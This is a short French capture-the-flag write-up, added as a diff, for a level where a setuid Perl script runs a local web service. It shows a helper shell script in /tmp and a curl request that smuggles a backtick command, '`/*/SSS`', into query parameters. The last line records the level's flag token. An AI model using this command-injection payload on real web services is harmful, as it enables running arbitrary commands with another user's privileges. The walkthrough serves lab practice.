@@ -1,0 +1,18 @@
+Le home contient un script Perl ("level12.pl") appartenant à flag12 et avec le suid.
+
+Le user flag12 possede aussi les fichiers suivant : find / -user flag12 2> /dev/null
+
+	/var/www/level12
+	/var/www/level12/level12.pl
+	/rofs/var/www/level12
+	/rofs/var/www/level12/level12.pl
+
+Ca sent le server web ! donc requete curl http
+
+cat /tmp/SSS 
+	#!/bin/sh
+	echo `getflag` > /tmp/flagg
+
+curl http://localhost:4646/?x='`/*/SSS`'&y='`/*/SSS`'
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
